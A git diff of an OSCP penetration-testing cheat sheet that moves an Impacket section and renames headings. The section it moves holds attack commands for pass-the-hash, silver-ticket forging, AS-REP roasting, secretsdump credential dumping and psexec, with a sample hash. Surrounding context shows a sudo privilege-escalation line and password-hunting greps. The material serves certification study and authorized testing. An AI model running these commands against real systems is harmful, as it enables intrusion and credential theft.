@@ -6,7 +6,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ### Basics
 | Tool | URL |
 | --- | --- |
-| Impacket | https://github.com/SecureAuthCorp/impacket |
 | Swaks | https://github.com/jetmore/swaks |
 | CyberChef | https://gchq.github.io/CyberChef/ |
 
@@ -68,6 +67,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ### Exploitation Tools
 | Tool | URL |
 | --- | --- |
+| Impacket | https://github.com/SecureAuthCorp/impacket |
 | lsassy | https://github.com/Hackndo/lsassy |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
@@ -840,6 +840,38 @@ john --show <file>
 ```
 
 ### Exploitation Tools
+#### Impacket
+##### Basic Commands
+```c
+psexec.py <user>@<remote_ip>
+sudo impacket-smbserver local . -smb2support
+rpcdump.py <target_domain>/<user>:<password/hash>@<remote_ip>
+smbclient.py <target_domain>/<user>:<password/hash>@<remote_ip>
+lookupsid.py <target_domain>/<user>:<password/hash>@<remote_ip>
+reg.py <target_domain>/<user>:[password:password hash]@<remote_ip> <action> <action>
+```
+##### Database Connections
+```c
+mssqlclient.py <user>@<remote_ip>
+mssqlclient.py <user>@<remote_ip> -windows-auth
+```
+##### Forging Silver Ticket
+```c
+getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+```
+##### ASPRepRoast
+```c
+GetNPUsers.py <target_domain>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+```
+##### PassTheHash
+```c
+getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+```
+##### SecretsDump
+```c
+secretsdump.py <domain>/<user>@<remote_ip>
+secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+```
 #### Web Shells
 ```c
 /usr/share/webshells
@@ -882,7 +914,7 @@ powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force
 ```c
 sudo -u#-1 /bin/bash
 ```
-#### Basic Enumeration / Linux
+#### Basic Linux Enumeration
 ```c
 id
 sudo -l
@@ -895,7 +927,7 @@ ps -auxf
 ls -lahv
 ls -R /home
 ```
-#### Basic Enumeration / Windows
+#### Basic Windows Enumeration
 ```c
 systeminfo
 whoami /all
@@ -926,38 +958,6 @@ find / -type f -user root -perm -4000 2>/dev/null
 grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
-```
-#### Impacket
-##### Basic Commands
-```c
-psexec.py <user>@<remote_ip>
-sudo impacket-smbserver local . -smb2support
-rpcdump.py <target_domain>/<user>:<password/hash>@<remote_ip>
-smbclient.py <target_domain>/<user>:<password/hash>@<remote_ip>
-lookupsid.py <target_domain>/<user>:<password/hash>@<remote_ip>
-reg.py <target_domain>/<user>:[password:password hash]@<remote_ip> <action> <action>
-```
-##### Database Connections
-```c
-mssqlclient.py <user>@<remote_ip>
-mssqlclient.py <user>@<remote_ip> -windows-auth
-```
-##### Forging Silver Ticket
-```c
-getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
-```
-##### ASPRepRoast
-```c
-GetNPUsers.py <target_domain>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-```
-##### PassTheHash
-```c
-getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
-```
-##### SecretsDump
-```c
-secretsdump.py <domain>/<user>@<remote_ip>
-secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
 ```
 #### JAWS
 ```c
